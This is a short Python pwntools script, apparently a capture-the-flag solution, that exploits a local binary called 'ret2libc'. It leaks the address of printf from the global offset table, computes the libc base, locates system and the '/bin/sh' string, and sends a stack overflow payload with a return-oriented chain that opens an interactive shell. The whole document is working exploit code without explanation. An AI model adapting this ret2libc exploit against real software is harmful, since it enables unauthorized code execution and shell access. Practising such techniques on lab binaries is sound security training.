from pwn import *

p = process('./ret2libc')

elf = ELF('./ret2libc')
libc = elf.libc

printfGOT = elf.got['printf']
p.sendlineafter('decimal:', str(printfGOT))
p.recvuntil('is ')
printf = int(p.recvline()[:-2].strip(),16)
base = printf - libc.sym['printf']
success('libc base = 0x%x', base)
system = base + libc.sym['system']
sh = base + next(libc.search(b'/bin/sh'))

pop_rdi = 0x0000000000400853
ret = 0x0000000000400599
payload = b'a\x00'
payload += b'a'*(0x28 - len(payload))
payload += p64(pop_rdi) + p64(sh) +p64(ret) + p64(system)
p.sendafter('ret2libcccccccccccc', payload)

p.interactive()
